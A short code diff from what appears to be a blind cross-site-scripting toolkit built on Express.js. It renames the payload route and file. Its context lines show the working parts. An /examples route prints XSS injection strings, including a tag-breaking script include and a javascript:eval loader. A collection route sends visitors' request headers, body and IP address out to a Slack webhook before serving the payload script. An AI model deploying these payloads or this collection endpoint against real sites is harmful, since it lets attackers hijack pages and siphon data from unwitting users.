@@ -98,7 +98,7 @@ app.get("/examples", (req, res) => {
   //var url = "https://globalcu.org";
   //var url = req.protocol + '://' + req.headers['host']
   var url = "https://" + req.headers["host"];
-  var page = "/";
+  var page = "";
   page += `\'"><script src="${url}"></script>\n\n`;
   page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;
 
@@ -201,7 +201,7 @@ app.get("/health", async (req, res) => {
   res.end();
 });
 
-app.all("/", (req, res) => {
+app.all("/pload", (req, res) => {
   var headers = req.headers;
   var data = req.body;
   data["Remote IP"] =
@@ -214,7 +214,7 @@ app.all("/", (req, res) => {
   };
 
   request.post(slack_incoming_webhook, data, (out) => {
-    res.sendFile(path.join(__dirname + "/payload.js"));
+    res.sendFile(path.join(__dirname + "/pload.js"));
   });
 });
 
